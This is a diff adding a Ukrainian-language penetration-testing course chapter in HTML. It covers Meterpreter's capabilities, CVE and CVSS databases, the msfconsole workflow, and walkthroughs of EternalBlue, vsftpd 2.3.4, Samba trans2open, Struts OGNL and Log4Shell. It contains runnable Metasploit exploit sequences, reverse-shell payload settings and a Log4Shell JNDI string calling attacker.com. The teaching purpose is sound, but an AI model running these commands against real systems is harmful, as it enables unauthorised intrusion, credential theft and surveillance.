+          <li><strong>Encrypted communication</strong> — весь трафік шифрується (TLS + AES)</li>
+          <li><strong>Reflective DLL injection</strong> — завантажується через reflective injection без торкання диску</li>
+          <li><strong>Extensible</strong> — можна завантажувати додаткові модулі (kiwi, incognito, stdapi) динамічно</li>
+          <li><strong>Migration</strong> — може мігрувати між процесами для стабільності та стелсу</li>
+        </ul>
+
+        <h3>Можливості Meterpreter за категоріями</h3>
+        <table>
+          <tr>
+            <th>Категорія</th>
+            <th>Команди</th>
+            <th>Опис</th>
+          </tr>
+          <tr>
+            <td><strong>Система</strong></td>
+            <td><code>sysinfo</code>, <code>getuid</code>, <code>getpid</code>, <code>ps</code>, <code>kill</code></td>
+            <td>Інформація про систему, поточний користувач, процеси</td>
+          </tr>
+          <tr>
+            <td><strong>Привілеї</strong></td>
+            <td><code>getsystem</code>, <code>getprivs</code></td>
+            <td>Підвищення до SYSTEM через різні техніки (Named Pipe, Token Duplication)</td>
+          </tr>
+          <tr>
+            <td><strong>Файлова система</strong></td>
+            <td><code>upload</code>, <code>download</code>, <code>cat</code>, <code>edit</code>, <code>ls</code>, <code>cd</code>, <code>mkdir</code>, <code>rm</code></td>
+            <td>Повний доступ до файлової системи</td>
+          </tr>
+          <tr>
+            <td><strong>Мережа</strong></td>
+            <td><code>portfwd</code>, <code>route</code>, <code>arp</code>, <code>netstat</code>, <code>ifconfig</code></td>
+            <td>Портфорвардинг, маршрутизація, мережева інформація</td>
+          </tr>
+          <tr>
+            <td><strong>Процеси</strong></td>
+            <td><code>migrate</code>, <code>execute</code>, <code>ps</code>, <code>steal_token</code></td>
+            <td>Міграція в інший процес, виконання команд, крадіжка токенів</td>
+          </tr>
+          <tr>
+            <td><strong>Облікові дані</strong></td>
+            <td><code>hashdump</code>, <code>load kiwi</code>, <code>creds_all</code>, <code>lsa_dump_sam</code></td>
+            <td>Дамп хешів, Mimikatz через kiwi-розширення, LSA secrets</td>
+          </tr>
+          <tr>
+            <td><strong>Кейлогінг</strong></td>
+            <td><code>keyscan_start</code>, <code>keyscan_dump</code>, <code>keyscan_stop</code></td>
+            <td>Запис натискань клавіш</td>
+          </tr>
+          <tr>
+            <td><strong>Зняття екрану</strong></td>
+            <td><code>screenshot</code>, <code>screenshare</code></td>
+            <td>Знімок та потокове відео екрану</td>
+          </tr>
+          <tr>
+            <td><strong>Веб-камера</strong></td>
+            <td><code>webcam_snap</code>, <code>webcam_stream</code>, <code>webcam_list</code></td>
+            <td>Фото та відео з камери</td>
+          </tr>
+          <tr>
+            <td><strong>Pivoting</strong></td>
+            <td><code>autoroute</code>, <code>portfwd add</code>, <code>socks_proxy</code></td>
+            <td>Маршрутизація через скомпрометовану машину в інші мережі</td>
+          </tr>
+        </table>
+
+        <h3>Варіанти Meterpreter</h3>
+        <table>
+          <tr>
+            <th>Варіант</th>
+            <th>Платформа</th>
+            <th>Повний шлях payload</th>
+          </tr>
+          <tr>
+            <td><strong>Windows x86</strong></td>
+            <td>Windows 32-bit</td>
+            <td><code>windows/meterpreter/reverse_tcp</code></td>
+          </tr>
+          <tr>
+            <td><strong>Windows x64</strong></td>
+            <td>Windows 64-bit</td>
+            <td><code>windows/x64/meterpreter/reverse_tcp</code></td>
+          </tr>
+          <tr>
+            <td><strong>Linux x86</strong></td>
+            <td>Linux 32-bit</td>
+            <td><code>linux/x86/meterpreter/reverse_tcp</code></td>
+          </tr>
+          <tr>
+            <td><strong>Linux x64</strong></td>
+            <td>Linux 64-bit</td>
+            <td><code>linux/x64/meterpreter/reverse_tcp</code></td>
+          </tr>
+          <tr>
+            <td><strong>Python</strong></td>
+            <td>Кросплатформний</td>
+            <td><code>python/meterpreter/reverse_tcp</code></td>
+          </tr>
+          <tr>
+            <td><strong>PHP</strong></td>
+            <td>Веб-сервер з PHP</td>
+            <td><code>php/meterpreter/reverse_tcp</code></td>
+          </tr>
+          <tr>
+            <td><strong>Java</strong></td>
+            <td>Кросплатформний (JVM)</td>
+            <td><code>java/meterpreter/reverse_tcp</code></td>
+          </tr>
+          <tr>
+            <td><strong>Android</strong></td>
+            <td>Android (APK)</td>
+            <td><code>android/meterpreter/reverse_tcp</code></td>
+          </tr>
+          <tr>
+            <td><strong>Apple iOS</strong></td>
+            <td>macOS / iOS</td>
+            <td><code>osx/x64/meterpreter/reverse_tcp</code></td>
+          </tr>
+        </table>
+
+        <h3>Практичний гайд вибору payload</h3>
+        <ul>
+          <li><strong>Windows-ціль з прямим з'єднанням:</strong> <code>windows/x64/meterpreter/reverse_tcp</code> — стандартний вибір</li>
+          <li><strong>Ціль за фаєрволом (лише HTTP):</strong> <code>windows/x64/meterpreter/reverse_https</code> — маскується під HTTPS-трафік</li>
+          <li><strong>Малий буфер (обмежений простір для shellcode):</strong> <code>windows/meterpreter/reverse_tcp</code> — staged, малий stager</li>
+          <li><strong>Нестабільна мережа:</strong> <code>windows/x64/meterpreter_reverse_tcp</code> — stageless, весь код одразу</li>
+          <li><strong>Linux-ціль:</strong> <code>linux/x64/meterpreter/reverse_tcp</code></li>
+          <li><strong>Веб-сервер PHP:</strong> <code>php/meterpreter/reverse_tcp</code></li>
+          <li><strong>Просто виконати команду:</strong> <code>cmd/unix/reverse_bash</code> або <code>windows/exec</code></li>
+        </ul>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- 5.5 Бази вразливостей та CVE                                 -->
+      <!-- ============================================================ -->
+      <section>
+        <h2>5.5 Бази вразливостей та CVE</h2>
+
+        <p>Перед експлуатацією необхідно знайти відповідний експлойт. Для цього пентестери використовують систему стандартизованої ідентифікації вразливостей — <strong>CVE</strong> (Common Vulnerabilities and Exposures) — та спеціалізовані бази даних.</p>
+
+        <h3>Система CVE</h3>
+        <p><strong>CVE</strong> (Common Vulnerabilities and Exposures) — це стандартна система ідентифікації відомих вразливостей, підтримувана організацією <strong>MITRE Corporation</strong> за фінансування CISA (Cybersecurity and Infrastructure Security Agency, США).</p>
+        <ul>
+          <li><strong>Формат:</strong> <code>CVE-YYYY-NNNNN</code> — рік + послідовний номер (до 7 цифр з 2014 року)</li>
+          <li><strong>CNA (CVE Numbering Authorities):</strong> 433 організації у 40 країнах мають право призначати CVE-ідентифікатори (серед них: Microsoft, Google, Red Hat, Apache, MITRE)</li>
+          <li><strong>Статистика 2024:</strong> 40,009 нових CVE опубліковано — зростання 38% порівняно з 2023 (28,961)</li>
+          <li><strong>Мета:</strong> єдина мова для ідентифікації вразливостей між різними інструментами, базами та організаціями</li>
+        </ul>
+
+        <h3>NVD (National Vulnerability Database)</h3>
+        <p><strong>NVD</strong> (National Vulnerability Database) — база даних NIST (National Institute of Standards and Technology), що <strong>збагачує</strong> CVE-записи додатковою інформацією:</p>
+        <ul>
+          <li><strong>CVSS Score</strong> — числова оцінка серйозності</li>
+          <li><strong>CPE (Common Platform Enumeration)</strong> — які продукти уражені</li>
+          <li><strong>CWE (Common Weakness Enumeration)</strong> — класифікація типу вразливості</li>
+          <li><strong>Посилання</strong> — патчі, advisory, PoC-коди</li>
+        </ul>
+
+        <h3>CVSS v3.1 — базові метрики</h3>
+        <p><strong>CVSS</strong> (Common Vulnerability Scoring System) — стандарт оцінки серйозності вразливостей. Поточна широко використовувана версія — <strong>CVSS v3.1</strong> (червень 2019):</p>
+        <table>
+          <tr>
+            <th>Метрика</th>
+            <th>Значення</th>
+            <th>Опис</th>
+          </tr>
+          <tr>
+            <td><strong>Attack Vector (AV)</strong></td>
+            <td>Network / Adjacent / Local / Physical</td>
+            <td>Звідки можна експлуатувати: мережа, сусідня мережа, локально, фізично</td>
+          </tr>
+          <tr>
+            <td><strong>Attack Complexity (AC)</strong></td>
+            <td>Low / High</td>
+            <td>Складність умов для експлуатації</td>
+          </tr>
+          <tr>
+            <td><strong>Privileges Required (PR)</strong></td>
+            <td>None / Low / High</td>
+            <td>Рівень привілеїв, необхідний атакуючому</td>
+          </tr>
+          <tr>
+            <td><strong>User Interaction (UI)</strong></td>
+            <td>None / Required</td>
+            <td>Чи потрібна дія від користувача</td>
+          </tr>
+          <tr>
+            <td><strong>Scope (S)</strong></td>
+            <td>Unchanged / Changed</td>
+            <td>Чи впливає експлуатація на інші компоненти</td>
+          </tr>
+          <tr>
+            <td><strong>Confidentiality (C)</strong></td>
+            <td>None / Low / High</td>
+            <td>Вплив на конфіденційність даних</td>
+          </tr>
+          <tr>
+            <td><strong>Integrity (I)</strong></td>
+            <td>None / Low / High</td>
+            <td>Вплив на цілісність даних</td>
+          </tr>
+          <tr>
+            <td><strong>Availability (A)</strong></td>
+            <td>None / Low / High</td>
+            <td>Вплив на доступність системи</td>
+          </tr>
+        </table>
+
+        <h3>Рівні серйозності CVSS</h3>
+        <table>
+          <tr>
+            <th>Рівень</th>
+            <th>Діапазон балів</th>
+            <th>Приклад</th>
+          </tr>
+          <tr>
+            <td><strong>None</strong></td>
+            <td>0.0</td>
+            <td>Інформаційне повідомлення</td>
+          </tr>
+          <tr>
+            <td><strong>Low</strong></td>
+            <td>0.1 — 3.9</td>
+            <td>Інформаційний витік (cookie без HttpOnly)</td>
+          </tr>
+          <tr>
+            <td><strong>Medium</strong></td>
+            <td>4.0 — 6.9</td>
+            <td>Stored XSS, CSRF</td>
+          </tr>
+          <tr>
+            <td><strong>High</strong></td>
+            <td>7.0 — 8.9</td>
+            <td>SQL Injection, Local Privilege Escalation</td>
+          </tr>
+          <tr>
+            <td><strong>Critical</strong></td>
+            <td>9.0 — 10.0</td>
+            <td>Remote Code Execution без автентифікації (Log4Shell, EternalBlue)</td>
+          </tr>
+        </table>
+
+        <h3>CVSS v4.0</h3>
+        <p><strong>CVSS v4.0</strong> опубліковано організацією FIRST у <strong>листопаді 2023</strong> року. Основні зміни:</p>
+        <ul>
+          <li><strong>Нові групи метрик:</strong> Supplemental (Automatable, Recovery, Provider Urgency) — додаткова контекстуальна інформація</li>
+          <li><strong>Granularity:</strong> окремі оцінки для Vulnerable System та Subsequent System (замість одного Scope)</li>
+          <li><strong>Attack Requirements (AT):</strong> нова метрика, що замінює частину Attack Complexity</li>
+          <li><strong>Нова номенклатура:</strong> CVSS-B (Base), CVSS-BT (Base+Threat), CVSS-BE (Base+Environmental), CVSS-BTE (повна)</li>
+          <li>Зворотна несумісність із v3.1 — бали не можна порівнювати напряму</li>
+        </ul>
+
+        <h3>Бази вразливостей</h3>
+        <table>
+          <tr>
+            <th>База</th>
+            <th>URL</th>
+            <th>Тип</th>
+            <th>Особливості</th>
+          </tr>
+          <tr>
+            <td><strong>CVE (MITRE)</strong></td>
+            <td>cve.org</td>
+            <td>Ідентифікація</td>
+            <td>Стандартні ідентифікатори, мінімальний опис</td>
+          </tr>
+          <tr>
+            <td><strong>NVD (NIST)</strong></td>
+            <td>nvd.nist.gov</td>
+            <td>Аналіз</td>
+            <td>CVSS, CPE, CWE, посилання на патчі</td>
+          </tr>
+          <tr>
+            <td><strong>Exploit-DB</strong></td>
+            <td>exploit-db.com</td>
+            <td>PoC / Exploit Code</td>
+            <td>Публічні експлойти, Google Hacking DB, SearchSploit (офлайн)</td>
+          </tr>
+          <tr>
+            <td><strong>SearchSploit</strong></td>
+            <td>CLI (Kali)</td>
+            <td>Офлайн пошук</td>
+            <td>Локальна копія Exploit-DB, працює без інтернету</td>
+          </tr>
+          <tr>
+            <td><strong>VulnDB</strong></td>
+            <td>vulndb.cyberriskanalytics.com</td>
+            <td>Комерційна</td>
+            <td>Найповніша база, 300,000+ записів, включає CVE + власні ID</td>
+          </tr>
+          <tr>
+            <td><strong>Rapid7 Vulnerability DB</strong></td>
+            <td>rapid7.com/db</td>
+            <td>Безкоштовна</td>
+            <td>Пряма інтеграція з Metasploit — показує модуль MSF для CVE</td>
+          </tr>
+          <tr>
+            <td><strong>AttackerKB</strong></td>
+            <td>attackerkb.com</td>
+            <td>Спільнота</td>
+            <td>Експертні оцінки: «чи реально експлуатується?», «чи є публічний PoC?»</td>
+          </tr>
+        </table>
+
+        <h3>SearchSploit — офлайн пошук експлойтів</h3>
+        <pre><code># Базовий пошук
+searchsploit vsftpd 2.3.4
+
+# Пошук за CVE
+searchsploit --cve 2017-0144
+
+# Пошук тільки за заголовком (без шляху)
+searchsploit -t apache struts
+
+# Скопіювати експлойт у поточну директорію
+searchsploit -m 42315      # Exploit-DB ID 42315
+
+# Показати повний шлях до файлу
+searchsploit -p 42315
+
+# Вивід у JSON
+searchsploit --json vsftpd
+
+# Оновити базу
+searchsploit -u</code></pre>
+
+        <h3>Практичний workflow пошуку</h3>
+        <ol>
+          <li><strong>Ідентифікація:</strong> Nmap визначив <code>vsftpd 2.3.4</code> на порту 21</li>
+          <li><strong>Пошук CVE:</strong> <code>searchsploit vsftpd 2.3.4</code> — знаходимо CVE-2011-2523</li>
+          <li><strong>Перевірка CVSS:</strong> NVD показує CVSS 9.8 (Critical) — pre-auth backdoor</li>
+          <li><strong>Пошук модуля MSF:</strong> <code>search vsftpd</code> в msfconsole — <code>exploit/unix/ftp/vsftpd_234_backdoor</code></li>
+          <li><strong>Верифікація:</strong> <code>info</code> для перевірки версій та платформ</li>
+          <li><strong>Експлуатація:</strong> <code>use</code> — <code>set RHOSTS</code> — <code>exploit</code></li>
+        </ol>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- 5.6 Практичний workflow Metasploit                           -->
+      <!-- ============================================================ -->
+      <section>
+        <h2>5.6 Практичний workflow Metasploit</h2>
+
+        <h3>Основні команди msfconsole</h3>
+
+        <p><strong>Навігація та пошук:</strong></p>
+        <pre><code>msf6 &gt; search [keyword]          # Пошук модулів
+msf6 &gt; use [module_path]         # Вибрати модуль
+msf6 &gt; back                      # Повернутись
+msf6 &gt; info                      # Детальна інформація про модуль
+msf6 &gt; show options              # Показати параметри
+msf6 &gt; show payloads             # Доступні пейлоади
+msf6 &gt; show targets              # Доступні цілі
+msf6 &gt; show advanced             # Розширені параметри</code></pre>
+
+        <p><strong>Конфігурація параметрів:</strong></p>
+        <pre><code>msf6 &gt; set RHOSTS 192.168.1.100       # Встановити ціль
+msf6 &gt; set RPORT 445                  # Встановити порт цілі
+msf6 &gt; set LHOST 192.168.1.50        # Встановити адресу атакуючого
+msf6 &gt; set LPORT 4444                # Встановити порт слухача
+msf6 &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 &gt; setg RHOSTS 192.168.1.100     # Глобальне значення (для всіх модулів)
+msf6 &gt; unset RHOSTS                  # Очистити значення
+msf6 &gt; unsetg RHOSTS                 # Очистити глобальне</code></pre>
+
+        <p><strong>Виконання:</strong></p>
+        <pre><code>msf6 &gt; run                    # Запуск (синонім exploit)
+msf6 &gt; exploit                # Запуск експлойту
+msf6 &gt; exploit -j             # Запуск у фоновому режимі (job)
+msf6 &gt; check                  # Перевірити вразливість без експлуатації
+msf6 &gt; rcheck                 # Перевірити і показати результат</code></pre>
+
+        <p><strong>Сесії:</strong></p>
+        <pre><code>msf6 &gt; sessions               # Список активних сесій (або sessions -l)
+msf6 &gt; sessions -i 1          # Підключитись до сесії #1
+msf6 &gt; sessions -u 1          # Апгрейд shell до Meterpreter
+msf6 &gt; sessions -k 1          # Закрити сесію #1
+msf6 &gt; sessions -K            # Закрити ВСІ сесії
+meterpreter &gt; background      # Повернутись у msfconsole, не закриваючи сесію</code></pre>
+
+        <p><strong>Фонові завдання (Jobs):</strong></p>
+        <pre><code>msf6 &gt; jobs                   # Список фонових завдань
+msf6 &gt; jobs -k 0              # Закрити завдання #0
+msf6 &gt; jobs -K                # Закрити всі</code></pre>
+
+        <p><strong>База даних:</strong></p>
+        <pre><code>msf6 &gt; db_status              # Статус підключення до PostgreSQL
+msf6 &gt; workspace              # Поточний workspace
+msf6 &gt; workspace -a client1   # Створити workspace
+msf6 &gt; db_nmap -sV -sC target # Nmap із збереженням результатів у БД
+msf6 &gt; hosts                  # Виявлені хости
+msf6 &gt; services               # Виявлені сервіси
+msf6 &gt; services -p 445        # Сервіси на порту 445
+msf6 &gt; vulns                  # Знайдені вразливості
+msf6 &gt; creds                  # Зібрані облікові дані
+msf6 &gt; loot                   # Зібрані файли та дані
+msf6 &gt; db_import scan.xml     # Імпорт результатів Nmap XML
+msf6 &gt; db_export -f xml out.xml  # Експорт бази</code></pre>
+
+        <h3>Повний workflow експлуатації (покроковий приклад)</h3>
+        <p>Сценарій: атака на Windows-машину з вразливим SMBv1 (EternalBlue):</p>
+
+        <pre><code># Крок 1: Сканування цілі через БД Metasploit
+msf6 &gt; workspace -a eternalblue_demo
+msf6 &gt; db_nmap -sV -sC -O -p- -T4 192.168.1.100
+
+# Крок 2: Перегляд результатів
+msf6 &gt; hosts
+msf6 &gt; services 192.168.1.100
+
+# Крок 3: Пошук експлойту
+msf6 &gt; search eternalblue
+# Matching Modules
+# ================
+#   #  Name                                      Rank     Description
+#   -  ----                                      ----     -----------
+#   0  exploit/windows/smb/ms17_010_eternalblue  average  MS17-010 EternalBlue
+#   1  exploit/windows/smb/ms17_010_psexec       normal   MS17-010 EternalRomance
+#   2  auxiliary/scanner/smb/smb_ms17_010                  MS17-010 Detection
+
+# Крок 4: Перевірка вразливості (без експлуатації)
+msf6 &gt; use auxiliary/scanner/smb/smb_ms17_010
+msf6 auxiliary(smb_ms17_010) &gt; set RHOSTS 192.168.1.100
+msf6 auxiliary(smb_ms17_010) &gt; run
+# [+] 192.168.1.100:445 - Host is likely VULNERABLE to MS17-010!
+
+# Крок 5: Вибір і налаштування експлойту
+msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit(ms17_010_eternalblue) &gt; show options
+msf6 exploit(ms17_010_eternalblue) &gt; set RHOSTS 192.168.1.100
+msf6 exploit(ms17_010_eternalblue) &gt; set LHOST 192.168.1.50
+msf6 exploit(ms17_010_eternalblue) &gt; set LPORT 4444
+msf6 exploit(ms17_010_eternalblue) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp
+
+# Крок 6: Перевірка (check)
+msf6 exploit(ms17_010_eternalblue) &gt; check
+# [+] 192.168.1.100:445 - The target is vulnerable.
+
+# Крок 7: Експлуатація
+msf6 exploit(ms17_010_eternalblue) &gt; exploit
+
+# [*] Started reverse TCP handler on 192.168.1.50:4444
+# [*] 192.168.1.100:445 - Connecting to target...
+# [*] 192.168.1.100:445 - Connection established for exploitation.
+# [+] 192.168.1.100:445 - Target OS selected valid for OS indicated by SMB reply
+# [*] Sending stage (200774 bytes) to 192.168.1.100
+# [*] Meterpreter session 1 opened (192.168.1.50:4444 -&gt; 192.168.1.100:49158)
+
+meterpreter &gt; sysinfo
+Computer        : WIN-TARGET
+OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
+Architecture    : x64
+Meterpreter     : x64/windows
+
+meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM</code></pre>
+
+        <h3>Налаштування Multi/Handler</h3>
+        <p><strong>Multi/Handler</strong> — це універсальний слухач (listener) для отримання зворотних з'єднань від payload'ів, згенерованих через msfvenom або доставлених іншим шляхом:</p>
+
+        <pre><code># Налаштування listener для reverse_tcp
+msf6 &gt; use exploit/multi/handler
+msf6 exploit(handler) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 exploit(handler) &gt; set LHOST 0.0.0.0        # Слухати на всіх інтерфейсах
+msf6 exploit(handler) &gt; set LPORT 4444
+msf6 exploit(handler) &gt; set ExitOnSession false   # Не закривати після першої сесії
+msf6 exploit(handler) &gt; exploit -j                # Запуск у фоні
+
+# [*] Exploit running as background job 0.
+# [*] Started reverse TCP handler on 0.0.0.0:4444
+
+# Коли payload виконається на цілі:
+# [*] Sending stage (200774 bytes) to 192.168.1.100
+# [*] Meterpreter session 1 opened
+
+msf6 &gt; sessions -i 1     # Підключитись до сесії</code></pre>
+
+        <h3>Workflow з базою даних</h3>
+        <pre><code># Створення workspace для проєкту
+msf6 &gt; workspace -a acme_pentest
+
+# Імпорт попередніх результатів Nmap
+msf6 &gt; db_import /root/nmap_scan.xml
+
+# Або запуск Nmap безпосередньо
+msf6 &gt; db_nmap -sV -sC -p- -T4 -oA acme 10.10.10.0/24
+
+# Перегляд хостів
+msf6 &gt; hosts
+# address       mac  name       os_name    os_flavor  purpose
+# -------       ---  ----       -------    ---------  -------
+# 10.10.10.1         router     Linux      Ubuntu     server
+# 10.10.10.50        webserver  Linux      Debian     server
+# 10.10.10.100       dc01       Windows    2016       server
+
+# Пошук сервісів на конкретному порту
+msf6 &gt; services -p 445
+# host          port  proto  name  state  info
+# ----          ----  -----  ----  -----  ----
+# 10.10.10.100  445   tcp    smb   open   Windows Server 2016
+
+# Використання результатів як цілей (прапорець -R)
+msf6 &gt; services -p 445 -R
+msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue
+# RHOSTS автоматично заповнений з результатів services -R
+
+# Експорт
+msf6 &gt; db_export -f xml /root/acme_results.xml</code></pre>
+
+        <h3>One-liner msfconsole</h3>
+        <pre><code># Запуск msfconsole з автоматичним виконанням
+msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; \
+  set RHOSTS 192.168.1.100; \
+  set LHOST 192.168.1.50; \
+  set PAYLOAD windows/x64/meterpreter/reverse_tcp; \
+  exploit"</code></pre>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- 5.7 Класичні експлойти та кейси                              -->
+      <!-- ============================================================ -->
+      <section>
+        <h2>5.7 Класичні експлойти та кейси</h2>
+
+        <p>Розуміння класичних експлойтів є критично важливим для пентестера. Кожен із наведених нижче кейсів ілюструє різний тип вразливості, різний вектор атаки та різний масштаб впливу. Ці експлойти часто зустрічаються у навчальних CTF та реальних пентестах застарілих систем.</p>
+
+        <h3>EternalBlue (MS17-010, CVE-2017-0144)</h3>
+        <table>
+          <tr><th>Параметр</th><th>Деталі</th></tr>
+          <tr><td><strong>CVE</strong></td><td>CVE-2017-0144</td></tr>
+          <tr><td><strong>CVSS</strong></td><td>8.1 (v3.0) / 9.8 (деякі оцінки NVD)</td></tr>
+          <tr><td><strong>Тип</strong></td><td>Remote Code Execution (Buffer Overflow)</td></tr>
+          <tr><td><strong>Вражені версії</strong></td><td>Windows XP, Vista, 7, 8, 8.1, 10; Server 2003, 2008, 2008 R2, 2012, 2016</td></tr>
+          <tr><td><strong>Протокол</strong></td><td>SMBv1 (порт 445)</td></tr>
+          <tr><td><strong>Патч</strong></td><td>MS17-010 (14 березня 2017)</td></tr>
+        </table>
+        <p><strong>Механізм:</strong> Buffer overflow у функції <code>Srv!SrvOs2FeaToNt</code> обробки SMBv1 Transaction 2 запитів у Windows kernel. Неправильна обробка перетворення FEA (Full Extended Attribute) із формату OS/2 на Windows NT дозволяє записати дані за межі виділеного буфера у пулі ядра.</p>
+        <p><strong>Історія:</strong> Розроблений <strong>NSA</strong> (Equation Group), викрадений та опублікований хакерською групою <strong>Shadow Brokers</strong> 14 квітня 2017. Через місяць використаний у двох найбільш руйнівних кібератаках:</p>
+        <ul>
+          <li><strong>WannaCry</strong> (12 травня 2017) — ransomware-хробак, що вразив 230,000+ комп'ютерів у 150 країнах. Збитки: $4-8 мільярдів</li>
+          <li><strong>NotPetya</strong> (27 червня 2017) — wiper, замаскований під ransomware. Збитки: $10+ мільярдів. Найбільш руйнівна кібератака в історії</li>
+        </ul>
+        <pre><code># Перевірка вразливості
+msf6 &gt; use auxiliary/scanner/smb/smb_ms17_010
+msf6 &gt; set RHOSTS 192.168.1.100
+msf6 &gt; run
+
+# Експлуатація
+msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue
+msf6 &gt; set RHOSTS 192.168.1.100
+msf6 &gt; set LHOST 192.168.1.50
+msf6 &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 &gt; exploit</code></pre>
+
+        <h3>vsftpd 2.3.4 Backdoor (CVE-2011-2523)</h3>
+        <table>
+          <tr><th>Параметр</th><th>Деталі</th></tr>
+          <tr><td><strong>CVE</strong></td><td>CVE-2011-2523</td></tr>
+          <tr><td><strong>CVSS</strong></td><td>9.8 (v3.1)</td></tr>
+          <tr><td><strong>Тип</strong></td><td>Backdoor (Supply Chain Attack)</td></tr>
+          <tr><td><strong>Вражена версія</strong></td><td>vsftpd 2.3.4 (скомпрометований вихідний код)</td></tr>
+          <tr><td><strong>Порт</strong></td><td>21 (FTP) / 6200 (backdoor)</td></tr>
+        </table>
+        <p><strong>Механізм:</strong> У липні 2011 невідомий зловмисник додав бекдор у вихідний код vsftpd на master сервері. Бекдор активується при введенні імені користувача, що містить смайлик <code>:)</code> (будь-яке ім'я з символами <code>0x3a</code> + <code>0x29</code>). Після тригеру відкривається shell-listener на порту 6200.</p>
+        <pre><code># Експлуатація
+msf6 &gt; use exploit/unix/ftp/vsftpd_234_backdoor
+msf6 &gt; set RHOSTS 192.168.1.100
+msf6 &gt; exploit
+# [*] 192.168.1.100:21 - Banner: 220 (vsFTPd 2.3.4)
+# [*] 192.168.1.100:21 - USER: 331 Please specify the password.
+# [+] 192.168.1.100:21 - Backdoor service has been spawned, handling...
+# [+] 192.168.1.100:21 - UID: uid=0(root) gid=0(root)</code></pre>
+
+        <h3>Samba trans2open (CVE-2003-0201)</h3>
+        <table>
+          <tr><th>Параметр</th><th>Деталі</th></tr>
+          <tr><td><strong>CVE</strong></td><td>CVE-2003-0201</td></tr>
+          <tr><td><strong>CVSS</strong></td><td>10.0 (v2.0)</td></tr>
+          <tr><td><strong>Тип</strong></td><td>Remote Buffer Overflow</td></tr>
+          <tr><td><strong>Вражені версії</strong></td><td>Samba 2.2.0 — 2.2.8a</td></tr>
+          <tr><td><strong>Порт</strong></td><td>139 (NetBIOS/SMB)</td></tr>
+        </table>
+        <p><strong>Механізм:</strong> Stack-based buffer overflow у функції обробки <code>trans2open</code> запитів. Дозволяє виконання довільного коду з правами root без автентифікації.</p>
+        <pre><code># Експлуатація
+msf6 &gt; use exploit/linux/samba/trans2open
+msf6 &gt; set RHOSTS 192.168.1.100
+msf6 &gt; set PAYLOAD linux/x86/shell_reverse_tcp
+msf6 &gt; set LHOST 192.168.1.50
+msf6 &gt; exploit</code></pre>
+
+        <h3>Apache Struts — Content-Type OGNL Injection (CVE-2017-5638)</h3>
+        <table>
+          <tr><th>Параметр</th><th>Деталі</th></tr>
+          <tr><td><strong>CVE</strong></td><td>CVE-2017-5638</td></tr>
+          <tr><td><strong>CVSS</strong></td><td>10.0 (v3.0)</td></tr>
+          <tr><td><strong>Тип</strong></td><td>Remote Code Execution (OGNL Injection)</td></tr>
+          <tr><td><strong>Вражені версії</strong></td><td>Apache Struts 2.3.5 — 2.3.31, 2.5 — 2.5.10</td></tr>
+          <tr><td><strong>Вектор</strong></td><td>HTTP Content-Type заголовок</td></tr>
+        </table>
+        <p><strong>Механізм:</strong> Модуль Jakarta Multipart parser некоректно обробляє заголовок <code>Content-Type</code>. При надсиланні спеціально сформованого Content-Type відбувається <strong>OGNL injection</strong> (Object-Graph Navigation Language) — виконання довільного Java-коду на сервері.</p>
+        <p><strong>Вплив:</strong> Цю вразливість використали для злому <strong>Equifax</strong> (вересень 2017) — витік персональних даних 143 мільйонів американців (імена, SSN, дати народження, адреси). Один із найбільших витоків даних в історії.</p>
+        <pre><code># Експлуатація
+msf6 &gt; use exploit/multi/http/apache_struts2_content_type_ognl
+msf6 &gt; set RHOSTS 192.168.1.100
+msf6 &gt; set RPORT 8080
+msf6 &gt; set TARGETURI /struts2-showcase/
+msf6 &gt; set PAYLOAD linux/x64/meterpreter/reverse_tcp
+msf6 &gt; set LHOST 192.168.1.50
+msf6 &gt; exploit</code></pre>
+
+        <h3>Log4Shell (CVE-2021-44228)</h3>
+        <table>
+          <tr><th>Параметр</th><th>Деталі</th></tr>
+          <tr><td><strong>CVE</strong></td><td>CVE-2021-44228</td></tr>
+          <tr><td><strong>CVSS</strong></td><td>10.0 (v3.1)</td></tr>
+          <tr><td><strong>Тип</strong></td><td>Remote Code Execution (JNDI Injection)</td></tr>
+          <tr><td><strong>Вражені версії</strong></td><td>Apache Log4j 2.0-beta9 — 2.14.1</td></tr>
+          <tr><td><strong>Вектор</strong></td><td>Будь-яке поле, що логується (HTTP headers, username, search queries)</td></tr>
+        </table>
+        <p><strong>Механізм:</strong> Бібліотека Log4j (Java) за замовчуванням обробляє <strong>JNDI lookup</strong> у логованих рядках. Атакуючий надсилає рядок виду <code>${jndi:ldap://attacker.com/exploit}</code> у будь-яке поле, що потрапляє у лог. Log4j виконує JNDI-запит до вказаного LDAP-сервера, завантажує та виконує Java-клас.</p>
+        <p><strong>Масштаб:</strong> Log4j використовується мільйонами Java-додатків — від Apache Tomcat та Elasticsearch до Minecraft та iCloud. Вразливість вразила до <strong>93%</strong> хмарних середовищ (Wiz, 2021).</p>
+        <pre><code># Експлуатація через Metasploit
+msf6 &gt; use exploit/multi/http/log4shell_header_injection
+msf6 &gt; set RHOSTS 192.168.1.100
+msf6 &gt; set RPORT 8080
+msf6 &gt; set SRVHOST 192.168.1.50    # LDAP/HTTP сервер атакуючого
+msf6 &gt; set LHOST 192.168.1.50
+msf6 &gt; set PAYLOAD java/meterpreter/reverse_tcp
+msf6 &gt; exploit
+
+# Payload надсилається у HTTP-заголовках:
+# X-Api-Version: ${jndi:ldap://192.168.1.50:1389/...}
+# User-Agent: ${jndi:ldap://192.168.1.50:1389/...}</code></pre>
+
+        <h3>BlueKeep (CVE-2019-0708)</h3>
+        <table>
+          <tr><th>Параметр</th><th>Деталі</th></tr>
+          <tr><td><strong>CVE</strong></td><td>CVE-2019-0708</td></tr>
+          <tr><td><strong>CVSS</strong></td><td>9.8 (v3.0)</td></tr>
+          <tr><td><strong>Тип</strong></td><td>Remote Code Execution (Use-After-Free)</td></tr>
+          <tr><td><strong>Вражені версії</strong></td><td>Windows XP, Vista, 7, Server 2003, 2008, 2008 R2</td></tr>
